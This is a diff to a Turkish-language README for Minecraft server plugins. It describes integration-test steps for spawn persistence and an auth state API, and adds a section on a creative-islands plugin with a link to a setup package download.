@@ -105,3 +105,7 @@ Gerçek Minecraft istemcisinde görsel inceleme ve başka eklentilerle uyumluluk
 Kayıt noktası testi: repo kökünde `node scripts/integration/spawn-regression.cjs`. KasabaRoles ve yerel FlightProbe test yardımcısı bulunmalıdır. Altı grup, yetki denetimini, nokta ayarlama/bilgiyi, son çıkış yerinden farklı noktada yeniden bağlanmayı, giriş sırasında başka ışınlanmaların engellenmesini, giriş sonrası aynı yerde kalmayı ve yeni kayıt olmayı sınar. Çıktıdaki `PERSIST_USER` adını al, test sunucusunu tamamen kapatıp aç ve `KASABA_SPAWN_PERSIST=1 KASABA_SPAWN_USER=<ad> node scripts/integration/spawn-regression.cjs` çalıştır. Bu aşama kalıcılığı ve `sil` sonrası eski davranışın geri gelmesini sınar. Ardından normal kayıt ve uçma testlerini çalıştır. Yardımcının kayıt yeri test kanalı da yalnızca loopback sunucusunda bulunur; üretim JAR'ına dahil değildir.
 
 Auth entegrasyonu: `tr.kasaba.auth.api.AuthState` yalnızca giriş durumunu sorgular; kimlik doğrulaması yapmaz. `PlayerAuthenticatedEvent`, hesap doğrulanıp form kapandıktan sonra ana iş parçacığında yayınlanır. Hub bu olayı dinler.
+
+## Yaratıcı adalar ve bilgi kitabı
+
+[KasabaAdalar 1.3.0](kasaba-adalar/README.md) oyuncu başına tek yaratıcı ada, 100 blok aralıklı dolu tabanlı 300 ada ve otomatik Adanı Yap oyun girişini sağlar. [Ada + Hub + dünya kurulum paketi](https://github.com/lazyunus3461/Sada/raw/refs/heads/main/dist/KasabaAdalar-Kurulum.zip) yeni KasabaHub 1.2.0 bilgi kitabını da içerir.
